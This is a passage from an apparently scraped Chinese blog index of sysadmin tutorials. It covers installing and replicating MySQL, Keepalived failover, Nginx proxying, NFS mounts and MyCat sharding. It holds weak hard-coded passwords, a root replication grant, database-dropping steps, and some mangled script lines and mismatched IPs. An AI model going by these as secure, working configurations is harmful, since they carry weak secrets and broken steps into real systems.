0EOFchmod +x /etc/keepalived/proxy_check.shsystemctl start keepalivedsystemctl enable keepalived &#x914D;&#x7F6E;MySQL12345678910111213141516171819202122232425#!/bin/bashyum remove -y mariadb-libs# &#x5B89;&#x88C5;MySQLrpm -ivh http://192.168.110.3/other/mysql-community-common-5.7.24-1.el7.x86_64.rpmrpm -ivh http://192.168.110.3/other/mysql-community-libs-5.7.24-1.el7.x86_64.rpmrpm -ivh http://192.168.110.3/other/mysql-community-client-5.7.24-1.el7.x86_64.rpmrpm -ivh http://192.168.110.3/other/mysql-community-server-5.7.24-1.el7.x86_64.rpmrpm -ivh http://192.168.110.3/other/mysql-community-libs-compat-5.7.32-1.el7.x86_64.rpmsystemctl start mysqld#systemctl enable mysqldsystemctl status mysqldecho &quot;skip-name-resolve&quot; &gt;&gt; /etc/my.cnfgrep &quot;temporary password&quot; /var/log/mysqld.log | awk &apos;{ print $NF }&apos;echo &quot;&#x4E0A;&#x9762;&#x662F;MySQL&#x521D;&#x59CB;&#x5BC6;&#x7801;&#xFF0C;&#x8BF7;&#x624B;&#x52A8;&#x4FEE;&#x6539;&#x5BC6;&#x7801;&quot;# mysql_secure_installation# show global variables like &quot;%password%&quot;;# set global validate_password_length=6;# set global validate_password_policy=LOW;# ALTER USER &apos;root&apos;@&apos;localhost&apos; IDENTIFIED BY &apos;ccc.456&apos;;# FLUSH PRIVILEGES; &#x914D;&#x7F6E;&#x4E3B;&#x4ECE;123456789101112131415161718#!/bin/bash#mysql_replica.shmysql -uroot -p&quot;ccc.456&quot;GRANT REPLICATION SLAVE ON *.* TO &apos;root&apos;@&apos;192.168.110.%&apos; IDENTIFIED BY &apos;ccc.456&apos;;FLUSH PRIVILEGES;quitcat &gt;&gt; /etc/my.cnf &lt;&lt;EOFserver-id=1log_bin=mysql-binquery_cache_type=OFFbinlog-ignore-db=performance_schemabinlog-ignore-db=mysqlbinlog-ignore-db=sysEOFsystemctl restart mysqld MySQL&#x7684;Keepalived&#x9AD8;&#x53EF;&#x7528;123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566echo -e &quot;192.168.110.18\\tserver18\\n192.168.110.19\\tserver19\\n&quot; &gt;&gt; /etc/hostsyum install -y keepalivedmv /etc/keepalived/keepalived.conf /etc/keepalived/keepalived.confbak# KeepAlivedcat &gt; /etc/keepalived/keepalived.conf &lt;&lt; EOF! Configuration File for keepalived global_defs { notification_email { Jaking@vip.163.com } notification_email_from keepalived@server18 smtp_server 127.0.0.1 smtp_connect_timeout 30 router_id server18 vrrp_mcast_group5 225.5.5.5} vrrp_script chk_proxy { script &quot;/etc/keepalived/proxy_check.sh&quot; interval 2 weight -2 } vrrp_instance VI_1 { state BACKUP nopreempt virtual_router_id 11 priority 100 advert_int 1 interface ens33 authentication { auth_type PASS auth_pass 1111 } virtual_ipaddress { 192.168.110.20/24 dev ens33 label ens33:1 } track_script { chk_proxy } smtp_alert}EOFcat &gt; /etc/keepalived/proxy_check.sh &lt;&lt;EOFecho &gt; /etc/keepalived/proxy_check.sh &lt;&lt; EOF#!/bin/bashnetstat -nlpt | grep -w &quot;3306&quot; &amp;&gt;&gt; /dev/null if [ $? -ne 0 ]then systemctl stop keepalivedfiexit 0EOFchmod a+x /etc/keepalived/proxy_check.shsystemctl restart keepalived &#x9879;&#x76EE;&#x4E0A;&#x7EBF;123456789101112yum install -y unzipunzip Cloudreve_v1.0.3&#x4E91;&#x76D8;.zipssh root@192.168.110.18 &quot;mysql -uroot -p&quot;ccc.456&quot; -e &apos;create database cloud;&apos;&quot;sql_user=&quot;mysql -uroot -p&quot;ccc.456&quot; -e &apos;GRANT ALL ON cloud.* TO &quot;abc&quot;@&quot;192.168.110.%&quot; IDENTIFIED BY &quot;Abc.abc.1&quot;;&apos;&quot;ssh root@192.168.110.18 &quot;$sql_user&quot;chown -R nobody:nobody /webData/chmod u+w /webData/runtime/chmod u+w /webData/public/cp /webData/application/database_sample.php /webData/application/database.php &#x4FEE;&#x6539;Nginx&#x4EE3;&#x7406;&#x914D;&#x7F6E;1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162cat /usr/local/nginx/conf/user/proxy.conf server {&#xA0;&#xA0;&#xA0;&#xA0;listen &#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;80;&#xA0;&#xA0;&#xA0;&#xA0;server_name &#xA0;www.uplookinglinux.com;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;charset utf-8;&#xA0;&#xA0;&#xA0;&#xA0;access_log &#xA0;/var/log/nginx/proxy.access.log &#xA0;main;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;#################################################&#xA0;&#xA0;&#xA0;&#xA0;fastcgi_connect_timeout 30;&#xA0;&#xA0;&#xA0;&#xA0;fastcgi_send_timeout 30;&#xA0;&#xA0;&#xA0;&#xA0;fastcgi_read_timeout 30;&#xA0;&#xA0;&#xA0;&#xA0;fastcgi_buffer_size &#xA0;64k;&#xA0;&#xA0;&#xA0;&#xA0;fastcgi_buffers 4 64k;&#xA0;&#xA0;&#xA0;&#xA0;fastcgi_busy_buffers_size 128k;&#xA0;&#xA0;&#xA0;&#xA0;fastcgi_temp_file_write_size 128k;&#xA0;&#xA0;&#xA0;&#xA0;#uri &#x5339;&#x914D; .php &#x6216;&#x8005; .php5 &#x7ED3;&#x5C3E;&#xA0;&#xA0;&#xA0;&#xA0;location ~ \\.(php|php5)$ {&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;root &#xA0;&#xA0;/var/www/web;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;#&#x6307;&#x5B9A;&#x4EE3;&#x7406;&#x5230; phpServer&#x96C6;&#x7FA4;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;fastcgi_pass &#xA0;phpServer;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;fastcgi_index index.php;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;fastcgi_param SCRIPT_FILENAME $document_root$fastcgi_script_name;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;include &#xA0;&#xA0;fastcgi_params;&#xA0;&#xA0;&#xA0;&#xA0;}&#xA0;&#xA0;&#xA0;&#xA0;#&#x5339;&#x914D;&#x6839;&#x76EE;&#x5F55;&#xFF0C;&#x56E0;&#x4E3A;&#x6839;&#x76EE;&#x5F55;&#x4E0B;&#x7684;&#x4E3B;&#x9875;&#x4E3A;index.php&#x52A8;&#x6001;&#x9875;&#x9762;&#xA0;&#xA0;&#xA0;&#xA0;location = / {&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;root &#xA0;&#xA0;/var/www/web;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;#&#x6307;&#x5B9A;&#x4EE3;&#x7406;&#x5230; phpServer&#x96C6;&#x7FA4;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;fastcgi_pass &#xA0;phpServer;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;fastcgi_index index.php;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;fastcgi_param SCRIPT_FILENAME $document_root$fastcgi_script_name;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;include &#xA0;&#xA0;fastcgi_params;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;}&#xA0;&#xA0;&#xA0;&#xA0;#################################################&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;location / {&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;#&#x8BBE;&#x7F6E;&#x4F2A;&#x9759;&#x6001;&#x8F6C;&#x53D1;&#x89C4;&#x5219;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;if (!-e $request_filename) {&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;rewrite &#xA0;^(.*)$ &#xA0;/index.php?s=/$1 &#xA0;last;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;break;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;}&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;root &#xA0;&#xA0;/var/www/web;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;index &#xA0;index.html index.htm;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;proxy_pass http://webServer;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;proxy_set_header X-Real-IP &#xA0;$remote_addr;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;proxy_set_header X-Forwarded-For &#xA0;&#xA0;$proxy_add_x_forwarded_for;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;proxy_redirect off;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;proxy_connect_timeout 30;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;proxy_send_timeout 15;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;proxy_read_timeout 15;&#xA0;&#xA0;&#xA0;&#xA0;}}yum install -y nfs-utilsmkdir -p /var/www/webchown nobody:nobody /var/www/web/mount -tnfs 192.168.110.17:/webData /var/www/web/echo -e &quot;192.168.10.17:/webData\\t/var/www/web\\tnfs\\tdefaults\\t0 0&quot; &gt;&gt; /etc/fstabmount -a document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });","tags":[]},{"title":"MyCat教程全国省份分片枚举操作","date":"2022-06-07T04:46:57.000Z","path":"/posts/8f74b0e7/","text":"MyCat&#x5206;&#x7247;&#x679A;&#x4E3E;&#x64CD;&#x4F5C;&#x2014;&#x2014;&#x5168;&#x56FD;&#x7701;&#x4EFD;&#x5206;&#x7247;&#x673A;&#x5668; IP &#x7CFB;&#x7EDF; &#x89D2;&#x8272; 192.168.73.20 CentOS 7.4 MyCat Server 192.168.73.21 RHEL 7.3 MySQL Server 5.7 192.168.73.22 CentOS 7.4 MySQL Server 5.7 192.168.73.23 RHEL 7.3 MySQL Server 5.7 &#x521B;&#x5EFA;&#x6570;&#x636E;&#x5E93;192.168.73.2112345678910111213141516drop database jakingtestdb01;drop database jakingtestdb02;drop database jakingtestdb03;create database jakingtestdb01 default character set utf8; create database jakingtestdb02 default character set utf8; create database jakingtestdb03 default character set utf8; create database jakingtestdb04 default character set utf8; create database jakingtestdb05 default character set utf8; create database jakingtestdb06 default character set utf8; create database jakingtestdb07 default character set utf8; create database jakingtestdb08 default character set utf8; create database jakingtestdb09 default character set utf8; create database jakingtestdb10 default character set utf8; create database jakingtestdb11 default character set utf8; create database jakingtestdb12 default character set utf8;show databases; 192.168.73.2212345678910111213141516drop database jakingtestdb04;drop database jakingtestdb05;drop database jakingtestdb06;create database jakingtestdb13 default character set utf8; create database jakingtestdb14 default character set utf8; create database jakingtestdb15 default character set utf8; create database jakingtestdb16 default character set utf8; create database jakingtestdb17 default character set utf8; create database jakingtestdb18 default character set utf8; create database jakingtestdb19 default character set utf8; create database jakingtestdb20 default character set utf8; create database jakingtestdb21 default character set utf8; create database jakingtestdb22 default character set utf8; create database jakingtestdb23 default character set utf8; create database jakingtestdb24 default character set utf8;show databases; 192.168.73.2312345678910111213141516drop database jakingtestdb07;drop database jakingtestdb08;drop database jakingtestdb09;create database jakingtestdb25 default character set utf8; create database jakingtestdb26 default character set utf8; create database jakingtestdb27 default character set utf8; create database jakingtestdb28 default character set utf8; create database jakingtestdb29 default character set utf8; create database jakingtestdb30 default character set utf8; create database jakingtestdb31 default character set utf8; create database jakingtestdb32 default character set utf8; create database jakingtestdb33 default character set utf8; create database jakingtestdb34 default character set utf8; create database jakingtestdb35 default character set utf8; create database jakingtestdb36 default character set utf8;show databases; &#x914D;&#x7F6E;MyCat&#x670D;&#x52A1;server.xml 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;!-- - - Licensed under the Apache License, Version 2.0 (the &quot;License&quot;); - you may not use this file except in compliance with the License. - You may obtain a copy of the License at - - http://www.apache.org/licenses/LICENSE-2.0 - - Unless required by applicable law or agreed to in writing, software - distributed under the License is distributed on an &quot;AS IS&quot; BASIS, - WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. - See the License for the specific language governing permissions and - limitations under the License. --&gt;&lt;!DOCTYPE mycat:server SYSTEM &quot;server.dtd&quot;&gt;&lt;mycat:server xmlns:mycat=&quot;http://io.mycat/&quot;&gt; &lt;system&gt; &lt;property name=&quot;nonePasswordLogin&quot;&gt;0&lt;/property&gt; &lt;!-- 0&#x4E3A;&#x9700;&#x8981;&#x5BC6;&#x7801;&#x767B;&#x9646;&#x3001;1&#x4E3A;&#x4E0D;&#x9700;&#x8981;&#x5BC6;&#x7801;&#x767B;&#x9646; ,&#x9ED8;&#x8BA4;&#x4E3A;0&#xFF0C;&#x8BBE;&#x7F6E;&#x4E3A;1&#x5219;&#x9700;&#x8981;&#x6307;&#x5B9A;&#x9ED8;&#x8BA4;&#x8D26;&#x6237;--&gt; &lt;property name=&quot;useHandshakeV10&quot;&gt;1&lt;/property&gt; &lt;property name=&quot;useSqlStat&quot;&gt;0&lt;/property&gt; &lt;!-- 1&#x4E3A;&#x5F00;&#x542F;&#x5B9E;&#x65F6;&#x7EDF;&#x8BA1;&#x3001;0&#x4E3A;&#x5173;&#x95ED; --&gt; &lt;property name=&quot;useGlobleTableCheck&quot;&gt;0&lt;/property&gt; &lt;!-- 1&#x4E3A;&#x5F00;&#x542F;&#x5168;&#x52A0;&#x73ED;&#x4E00;&#x81F4;&#x6027;&#x68C0;&#x6D4B;&#x3001;0&#x4E3A;&#x5173;&#x95ED; --&gt; &lt;property name=&quot;sqlExecuteTimeout&quot;&gt;300&lt;/property&gt; &lt;!-- SQL &#x6267;&#x884C;&#x8D85;&#x65F6; &#x5355;&#x4F4D;:&#x79D2;--&gt; &lt;property name=&quot;sequnceHandlerType&quot;&gt;2&lt;/property&gt; &lt;!--&lt;property name=&quot;sequnceHandlerPattern&quot;&gt;(?:(\\s*next\\s+value\\s+for\\s*MYCATSEQ_(\\w+))(,|\\)|\\s)*)+&lt;/property&gt;--&gt; &lt;!--&#x5FC5;&#x987B;&#x5E26;&#x6709;MYCATSEQ_&#x6216;&#x8005; mycatseq_&#x8FDB;&#x5165;&#x5E8F;&#x5217;&#x5339;&#x914D;&#x6D41;&#x7A0B; &#x6CE8;&#x610F;MYCATSEQ_&#x6709;&#x7A7A;&#x683C;&#x7684;&#x60C5;&#x51B5;--&gt; &lt;property name=&quot;sequnceHandlerPattern&quot;&gt;(?:(\\s*next\\s+value\\s+for\\s*MYCATSEQ_(\\w+))(,|\\)|\\s)*)+&lt;/property&gt; &lt;property name=&quot;subqueryRelationshipCheck&quot;&gt;false&lt;/property&gt; &lt;!-- &#x5B50;&#x67E5;&#x8BE2;&#x4E2D;&#x5B58;&#x5728;&#x5173;&#x8054;&#x67E5;&#x8BE2;&#x7684;&#x60C5;&#x51B5;&#x4E0B;,&#x68C0;&#x67E5;&#x5173;&#x8054;&#x5B57;&#x6BB5;&#x4E2D;&#x662F;&#x5426;&#x6709;&#x5206;&#x7247;&#x5B57;&#x6BB5; .&#x9ED8;&#x8BA4; false --&gt; &lt;!-- &lt;property name=&quot;useCompression&quot;&gt;1&lt;/property&gt;--&gt; &lt;!--1&#x4E3A;&#x5F00;&#x542F;mysql&#x538B;&#x7F29;&#x534F;&#x8BAE;--&gt; &lt;!-- &lt;property name=&quot;fakeMySQLVersion&quot;&gt;5.6.20&lt;/property&gt;--&gt; &lt;!--&#x8BBE;&#x7F6E;&#x6A21;&#x62DF;&#x7684;MySQL&#x7248;&#x672C; &#x53F7;--&gt; &lt;!-- &lt;property name=&quot;processorBufferChunk&quot;&gt;40960&lt;/property&gt; --&gt; &lt;!-- &lt;property name=&quot;processors&quot;&gt;1&lt;/property&gt; &lt;property name=&quot;processorExecutor&quot;&gt;32&lt;/property&gt; --&gt; &lt;!--&#x9ED8;&#x8BA4;&#x4E3A;type 0: DirectByteBufferPool | type 1 ByteBufferArena | type 2 NettyBufferPool --&gt; &lt;property name=&quot;processorBufferPoolType&quot;&gt;0&lt;/property&gt; &lt;!--&#x9ED8;&#x8BA4;&#x662F;65535 64K &#x7528;&#x4E8E;sql&#x89E3;&#x6790;&#x65F6;&#x6700;&#x5927;&#x6587;&#x672C;&#x957F;&#x5EA6; --&gt; &lt;!--&lt;property name=&quot;maxStringLiteralLength&quot;&gt;65535&lt;/property&gt;--&gt; &lt;!--&lt;property name=&quot;sequnceHandlerType&quot;&gt;0&lt;/property&gt;--&gt; &lt;!--&lt;property name=&quot;backSocketNoDelay&quot;&gt;1&lt;/property&gt;--&gt; &lt;!--&lt;property name=&quot;frontSocketNoDelay&quot;&gt;1&lt;/property&gt;--&gt; &lt;!--&lt;property name=&quot;processorExecutor&quot;&gt;16&lt;/property&gt;--&gt; &lt;!-- &lt;property name=&quot;serverPort&quot;&gt;8066&lt;/property&gt; &lt;property name=&quot;managerPort&quot;&gt;9066&lt;/property&gt; &lt;property name=&quot;idleTimeout&quot;&gt;300000&lt;/property&gt; &lt;property name=&quot;bindIp&quot;&gt;0.0.0.0&lt;/property&gt; &lt;property name=&quot;dataNodeIdleCheckPeriod&quot;&gt;300000&lt;/property&gt; 5 * 60 * 1000L; //&#x8FDE;&#x63A5;&#x7A7A;&#x95F2;&#x68C0;&#x67E5; &lt;property name=&quot;frontWriteQueueSize&quot;&gt;4096&lt;/property&gt; &lt;property name=&quot;processors&quot;&gt;32&lt;/property&gt; --&gt; &lt;!--&#x5206;&#x5E03;&#x5F0F;&#x4E8B;&#x52A1;&#x5F00;&#x5173;&#xFF0C;0&#x4E3A;&#x4E0D;&#x8FC7;&#x6EE4;&#x5206;&#x5E03;&#x5F0F;&#x4E8B;&#x52A1;&#xFF0C;1&#x4E3A;&#x8FC7;&#x6EE4;&#x5206;&#x5E03;&#x5F0F;&#x4E8B;&#x52A1;&#xFF08;&#x5982;&#x679C;&#x5206;&#x5E03;&#x5F0F;&#x4E8B;&#x52A1;&#x5185; &#x53EA;&#x6D89;&#x53CA;&#x5168;&#x5C40;&#x8868;&#xFF0C;&#x5219;&#x4E0D;&#x8FC7;&#x6EE4;&#xFF09;&#xFF0C;2&#x4E3A;&#x4E0D;&#x8FC7;&#x6EE4;&#x5206;&#x5E03;&#x5F0F;&#x4E8B;&#x52A1;,&#x4F46;&#x662F;&#x8BB0;&#x5F55;&#x5206;&#x5E03;&#x5F0F;&#x4E8B;&#x52A1;&#x65E5;&#x5FD7;--&gt; &lt;property name=&quot;handleDistributedTransactions&quot;&gt;0&lt;/property&gt; &lt;!-- off heap for merge/order/group/limit 1&#x5F00;&#x542F; 0&#x5173;&#x95ED; --&gt; &lt;property name=&quot;useOffHeapForMerge&quot;&gt;0&lt;/property&gt; &lt;!-- &#x5355;&#x4F4D;&#x4E3A;m --&gt; &lt;property name=&quot;memoryPageSize&quot;&gt;64k&lt;/property&gt; &lt;!-- &#x5355;&#x4F4D;&#x4E3A;k --&gt; &lt;property name=&quot;spillsFileBufferSize&quot;&gt;1k&lt;/property&gt; &lt;property name=&quot;useStreamOutput&quot;&gt;0&lt;/property&gt; &lt;!-- &#x5355;&#x4F4D;&#x4E3A;m --&gt; &lt;property name=&quot;systemReserveMemorySize&quot;&gt;384m&lt;/property&gt; &lt;!--&#x662F;&#x5426;&#x91C7;&#x7528;zookeeper&#x534F;&#x8C03;&#x5207;&#x6362; --&gt; &lt;property name=&quot;useZKSwitch&quot;&gt;false&lt;/property&gt; &lt;!-- XA Recovery Log&#x65E5;&#x5FD7;&#x8DEF;&#x5F84; --&gt; &lt;!--&lt;property name=&quot;XARecoveryLogBaseDir&quot;&gt;./&lt;/property&gt;--&gt; &lt;!-- XA Recovery Log&#x65E5;&#x5FD7;&#x540D;&#x79F0; --&gt; &lt;!--&lt;property name=&quot;XARecoveryLogBaseName&quot;&gt;tmlog&lt;/property&gt;--&gt; &lt;!--&#x5982;&#x679C;&#x4E3A; true&#x7684;&#x8BDD; &#x4E25;&#x683C;&#x9075;&#x5B88;&#x9694;&#x79BB;&#x7EA7;&#x522B;,&#x4E0D;&#x4F1A;&#x5728;&#x4EC5;&#x4EC5;&#x53EA;&#x6709;select&#x8BED;&#x53E5;&#x7684;&#x65F6;&#x5019;&#x5728;&#x4E8B;&#x52A1;&#x4E2D;&#x5207;&#x6362;&#x8FDE;&#x63A5;--&gt; &lt;property name=&quot;strictTxIsolation&quot;&gt;false&lt;/property&gt; &lt;property name=&quot;useZKSwitch&quot;&gt;true&lt;/property&gt; &lt;/system&gt; &lt;!-- &#x5168;&#x5C40;SQL&#x9632;&#x706B;&#x5899;&#x8BBE;&#x7F6E; --&gt; &lt;!--&#x767D;&#x540D;&#x5355;&#x53EF;&#x4EE5;&#x4F7F;&#x7528;&#x901A;&#x914D;&#x7B26;%&#x6216;&#x7740;*--&gt; &lt;!--&#x4F8B;&#x5982;&lt;host host=&quot;127.0.0.*&quot; user=&quot;root&quot;/&gt;--&gt; &lt;!--&#x4F8B;&#x5982;&lt;host host=&quot;127.0.*&quot; user=&quot;root&quot;/&gt;--&gt; &lt;!--&#x4F8B;&#x5982;&lt;host host=&quot;127.*&quot; user=&quot;root&quot;/&gt;--&gt; &lt;!--&#x4F8B;&#x5982;&lt;host host=&quot;1*7.*&quot; user=&quot;root&quot;/&gt;--&gt; &lt;!--&#x8FD9;&#x4E9B;&#x914D;&#x7F6E;&#x60C5;&#x51B5;&#x4E0B;&#x5BF9;&#x4E8E;127.0.0.1&#x90FD;&#x80FD;&#x4EE5;root&#x8D26;&#x6237;&#x767B;&#x5F55;--&gt; &lt;!-- &lt;firewall&gt; &lt;whitehost&gt; &lt;host host=&quot;1*7.0.0.*&quot; user=&quot;root&quot;/&gt; &lt;/whitehost&gt; &lt;blacklist check=&quot;false&quot;&gt; &lt;/blacklist&gt; &lt;/firewall&gt; --&gt; &lt;user name=&quot;root&quot; defaultAccount=&quot;true&quot;&gt; &lt;property name=&quot;password&quot;&gt;123456&lt;/property&gt; &lt;property name=&quot;schemas&quot;&gt;mycatdb&lt;/property&gt; &lt;!-- &#x8868;&#x7EA7; DML &#x6743;&#x9650;&#x8BBE;&#x7F6E; --&gt; &lt;!-- &lt;privileges check=&quot;false&quot;&gt; &lt;schema name=&quot;TESTDB&quot; dml=&quot;0110&quot; &gt; &lt;table name=&quot;tb01&quot; dml=&quot;0000&quot;&gt;&lt;/table&gt; &lt;table name=&quot;tb02&quot; dml=&quot;1111&quot;&gt;&lt;/table&gt; &lt;/schema&gt; &lt;/privileges&gt; --&gt; &lt;/user&gt; &lt;user name=&quot;user&quot;&gt; &lt;property name=&quot;password&quot;&gt;ccc.456&lt;/property&gt; &lt;property name=&quot;schemas&quot;&gt;mycatdb&lt;/property&gt; &lt;property name=&quot;readOnly&quot;&gt;true&lt;/property&gt; &lt;/user&gt;&lt;/mycat:server&gt; schema.xml 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374&lt;?xml version=&quot;1.0&quot;?&gt;&lt;!DOCTYPE mycat:schema SYSTEM &quot;schema.dtd&quot;&gt;&lt;mycat:schema xmlns:mycat=&quot;http://io.mycat/&quot;&gt;&lt;schema name=&quot;mycatdb&quot; checkSQLschema=&quot;false&quot; sqlMaxLimit=&quot;100&quot;&gt; &lt;table name=&quot;jaking_member&quot; dataNode=&quot;dnmycatdb$1-35&quot; rule=&quot;sharding-by-intfile-mycatdb-jakingtest_member&quot;&gt;&lt;/table&gt;&lt;/schema&gt;&lt;!-- &#x8BBE;&#x5B9A;&#x6570;&#x636E;&#x7ED3;&#x70B9; dnmycatdb1-dnmycatdb12 &#x5BF9;&#x5E94;&#x7684; 192.168.73.21 &#x670D;&#x52A1; &#x4EE5;&#x53CA;&#x5BF9;&#x5E94;&#x7684;&#x7269;&#x7406; schema --&gt;&lt;dataNode name=&quot;dnmycatdb1&quot; dataHost=&quot;192.168.73.21&quot; database=&quot;jakingtestdb01&quot; /&gt;&lt;dataNode name=&quot;dnmycatdb2&quot; dataHost=&quot;192.168.73.21&quot; database=&quot;jakingtestdb02&quot; /&gt;&lt;dataNode name=&quot;dnmycatdb3&quot; dataHost=&quot;192.168.73.21&quot; database=&quot;jakingtestdb03&quot; /&gt;&lt;dataNode name=&quot;dnmycatdb4&quot; dataHost=&quot;192.168.73.21&quot; database=&quot;jakingtestdb04&quot; /&gt;&lt;dataNode name=&quot;dnmycatdb5&quot; dataHost=&quot;192.168.73.21&quot; database=&quot;jakingtestdb05&quot; /&gt;&lt;dataNode name=&quot;dnmycatdb6&quot; dataHost=&quot;192.168.73.21&quot; database=&quot;jakingtestdb06&quot; /&gt;&lt;dataNode name=&quot;dnmycatdb7&quot; dataHost=&quot;192.168.73.21&quot; database=&quot;jakingtestdb07&quot; /&gt;&lt;dataNode name=&quot;dnmycatdb8&quot; dataHost=&quot;192.168.73.21&quot; database=&quot;jakingtestdb08&quot; /&gt;&lt;dataNode name=&quot;dnmycatdb9&quot; dataHost=&quot;192.168.73.21&quot; database=&quot;jakingtestdb09&quot; /&gt;&lt;dataNode name=&quot;dnmycatdb10&quot; dataHost=&quot;192.168.73.21&quot; database=&quot;jakingtestdb10&quot; /&gt;&lt;dataNode name=&quot;dnmycatdb11&quot; dataHost=&quot;192.168.73.21&quot; database=&quot;jakingtestdb11&quot; /&gt;&lt;dataNode name=&quot;dnmycatdb12&quot; dataHost=&quot;192.168.73.21&quot; database=&quot;jakingtestdb12&quot; /&gt;&lt;!-- &#x8BBE;&#x5B9A;&#x6570;&#x636E;&#x7ED3;&#x70B9; dnmycatdb13-dnmycatdb24 &#x5BF9;&#x5E94;&#x7684; 192.168.73.22 &#x670D;&#x52A1; &#x4EE5;&#x53CA;&#x5BF9;&#x5E94;&#x7684; &#x7269;&#x7406; schema --&gt;&lt;dataNode name=&quot;dnmycatdb13&quot; dataHost=&quot;192.168.73.22&quot; database=&quot;jakingtestdb13&quot; /&gt;&lt;dataNode name=&quot;dnmycatdb14&quot; dataHost=&quot;192.168.73.22&quot; database=&quot;jakingtestdb14&quot; /&gt;&lt;dataNode name=&quot;dnmycatdb15&quot; dataHost=&quot;192.168.73.22&quot; database=&quot;jakingtestdb15&quot; /&gt;&lt;dataNode name=&quot;dnmycatdb16&quot; dataHost=&quot;192.168.73.22&quot; database=&quot;jakingtestdb16&quot; /&gt;&lt;dataNode name=&quot;dnmycatdb17&quot; dataHost=&quot;192.168.73.22&quot; database=&quot;jakingtestdb17&quot; /&gt;&lt;dataNode name=&quot;dnmycatdb18&quot; dataHost=&quot;192.168.73.22&quot; database=&quot;jakingtestdb18&quot; /&gt;&lt;dataNode name=&quot;dnmycatdb19&quot; dataHost=&quot;192.168.73.22&quot; database=&quot;jakingtestdb19&quot; /&gt;&lt;dataNode name=&quot;dnmycatdb20&quot; dataHost=&quot;192.168.73.22&quot; database=&quot;jakingtestdb20&quot; /&gt;&lt;dataNode name=&quot;dnmycatdb21&quot; dataHost=&quot;192.168.73.22&quot; database=&quot;jakingtestdb21&quot; /&gt;&lt;dataNode name=&quot;dnmycatdb22&quot; dataHost=&quot;192.168.73.22&quot; database=&quot;jakingtestdb22&quot; /&gt;&lt;dataNode name=&quot;dnmycatdb23&quot; dataHost=&quot;192.168.73.22&quot; database=&quot;jakingtestdb23&quot; /&gt;&lt;dataNode name=&quot;dnmycatdb24&quot; dataHost=&quot;192.168.73.22&quot; database=&quot;jakingtestdb24&quot; /&gt;&lt;!-- &#x8BBE;&#x5B9A;&#x6570;&#x636E;&#x7ED3;&#x70B9; dnmycatdb25-dnmycatdb35 &#x5BF9;&#x5E94;&#x7684; 192.168.73.23 &#x670D;&#x52A1; &#x4EE5;&#x53CA;&#x5BF9;&#x5E94;&#x7684; &#x7269;&#x7406; schema --&gt;&lt;dataNode name=&quot;dnmycatdb25&quot; dataHost=&quot;192.168.73.23&quot; database=&quot;jakingtestdb25&quot; /&gt;&lt;dataNode name=&quot;dnmycatdb26&quot; dataHost=&quot;192.168.73.23&quot; database=&quot;jakingtestdb26&quot; /&gt;&lt;dataNode name=&quot;dnmycatdb27&quot; dataHost=&quot;192.168.73.23&quot; database=&quot;jakingtestdb27&quot; /&gt;&lt;dataNode name=&quot;dnmycatdb28&quot; dataHost=&quot;192.168.73.23&quot; database=&quot;jakingtestdb28&quot; /&gt;&lt;dataNode name=&quot;dnmycatdb29&quot; 